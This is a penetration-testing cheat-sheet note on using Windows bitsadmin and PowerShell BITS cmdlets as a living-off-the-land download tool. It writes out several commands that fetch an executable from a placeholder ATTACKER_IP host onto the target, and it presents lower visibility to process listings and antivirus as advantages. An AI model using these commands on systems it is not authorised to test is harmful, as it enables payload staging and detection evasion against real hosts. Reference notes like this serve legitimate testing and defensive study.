---
tags: [pentest, transfer, bitsadmin, lolbin, windows, initial-access]
tool: bitsadmin
phase: 5
---
# bitsadmin Download (LOLBin)

Windows Background Intelligent Transfer Service CLI. Downloads files as a background job — less conspicuous than certutil.

[[00 - README|Folder index]]

## Quick download

```cmd
bitsadmin /transfer myJob /download /priority high http://ATTACKER_IP/file.exe C:\Temp\file.exe
```

## Multi-step (more control)

```cmd
bitsadmin /create myJob
bitsadmin /addfile myJob http://ATTACKER_IP/file.exe C:\Temp\file.exe
bitsadmin /resume myJob
bitsadmin /complete myJob
```

## PowerShell BITS

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source http://ATTACKER_IP/file.exe -Destination C:\Temp\file.exe
```

## Advantages over certutil

- Runs as a background service — less visible in process listings
- Supports resume on network interruption
- Can transfer multiple files in one job
- Less monitored by some AV products

> [!tip] bitsadmin is deprecated
> Microsoft recommends PowerShell BITS cmdlets instead. But `bitsadmin.exe` is still present on all Windows versions and works from cmd.exe without PowerShell.

## See also

- [[15 - certutil Download (LOLBin)]]
- [[14 - PowerShell Download Methods]]
